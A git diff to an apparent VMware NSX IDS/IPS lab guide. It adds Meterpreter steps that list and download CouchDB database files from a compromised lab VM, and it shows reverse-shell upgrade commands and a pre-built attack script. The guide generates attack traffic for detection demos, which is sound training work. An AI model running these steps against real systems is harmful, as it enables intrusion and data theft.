@@ -502,12 +502,7 @@ OS          : Linux 273e1700c5be 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21
 Meterpreter : php/linux
 meterpreter > ?
 ```
-  * Type **ls** to see files on the filesystem
-  * Type **download** and specify any of the files you discoverd above to download those to your local machine
-
-> **Note**: Do not fatally damage the exploited VM at this point, as we will be using it again in other exercises. Do not close the Meterpreter session as we will use this existing session to move our attack in the next exercise.
-
-7. When you are done exploiting, type exit -z to shut down Meterpreter
+7. When you are done, type exit -z to shut down the Meterpreter session
 
 **Confirm IDS/IPS Events show up in the NSX Manager UI**
 1.	In the NSX Manager UI, navigate to Security -->  Security Overview
@@ -605,7 +600,7 @@ msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
 ```
 3. You can now interact with the shell session or upgrade to a more powerful Meterpreter session. In order to upgrade to Meterpreter, you can run the below commands 
     * Type **background** to move the shell session to the background. Confirm by entering **y**
-    * Type **use multi/manage/shell_to_meterpreter** to select the CouchDB Command Execution exploit module
+    * Type **use multi/manage/shell_to_meterpreter** to select the shell to meterpreter upgrade module
     * Type **set LPORT 8081** to define the local port to use. The reverse shell will be established to this local port
     * Type **set session 2** to indicate the reverse command shell session from **App1-APP-TIER VM** is the one we want to upgrade
     * Type **exploit** to establish the session
@@ -717,7 +712,7 @@ msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
 ```
 3. You can now also upgrade this shell to Meterpreter, by running the below commands 
     * Type **background** to move the shell session to the background. Confirm by entering **y**
-    * Type **use multi/manage/shell_to_meterpreter** to select the CouchDB Command Execution exploit module
+    * Type **use multi/manage/shell_to_meterpreter** to select the shell to meterpreter upgrade module
     * Type **set LPORT 8082** to define the local port to use. The reverse shell will be established to this local port
     * Type **set session 4** to indicate the reverse command shell session from **App2-APP-TIER VM** is the one we want to upgrade
     * Type **exploit** to establish the session
@@ -736,6 +731,39 @@ msf5 post(multi/manage/shell_to_meterpreter) > exploit
 ```console
 msf5 post(multi/manage/shell_to_meterpreter) > sessions -l
 ```
+   * Type **sessions -i 5** to interact with the newly established **Meterpreter** session
+   * You can now run commands as in the previous exercise to gain more information about the **App2-APP-TIER VM**, retrieve or destroy data. 
+   * Type **ls /opt/couchdb/data** to see CouchDB database files   
+   * Type **download /opt/couchdb/data** to see CouchDB database files
+
+
+```console
+
+meterpreter > ls /opt/couchdb/data
+Listing: /opt/couchdb/data
+==========================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+40755/rwxr-xr-x   4096   dir   2020-07-22 11:33:51 -0500  ._replicator_design
+40755/rwxr-xr-x   4096   dir   2020-07-22 11:28:51 -0500  ._users_design
+40755/rwxr-xr-x   4096   dir   2020-07-22 11:28:48 -0500  .delete
+40755/rwxr-xr-x   4096   dir   2020-07-22 11:33:51 -0500  .shards
+100644/rw-r--r--  24764  fil   2020-07-22 15:14:44 -0500  _dbs.couch
+100644/rw-r--r--  8368   fil   2020-07-22 11:28:51 -0500  _nodes.couch
+100644/rw-r--r--  8374   fil   2020-07-22 11:28:51 -0500  _replicator.couch
+100644/rw-r--r--  8374   fil   2020-07-22 11:28:51 -0500  _users.couch
+40755/rwxr-xr-x   4096   dir   2020-07-22 11:28:52 -0500  shards
+
+meterpreter > download /opt/couchdb/data/
+[*] mirroring  : /opt/couchdb/data//.delete -> /.delete
+[*] mirrored   : /opt/couchdb/data//.delete -> /.delete
+[*] mirroring  : /opt/couchdb/data//._users_design -> /._users_design
+[*] mirroring  : /opt/couchdb/data//._users_design/mrview -> /._users_design/mrview
+[*] downloading: /opt/couchdb/data//._users_design/mrview/3e823c2a4383ac0c18d4e574135a5b08.view -> /._users_design/mrview/3e823c2a4383ac0c18d4e574135a5b08.view
+...
+```
+
 
 If you prefer not to manually go through this attack scenario, using the below steps, you can instead run the pre-defined attack script by running **sudo ./attack2.sh**. Before you execute the script, use **sudo nano attack1.rc** and replace the RHOST and LHOST IP addresses accordingly to match with the IP addresses in your environment. 
 **RHOST** on line 3 should be the IP address of the **App1-WEB-TIER VM**
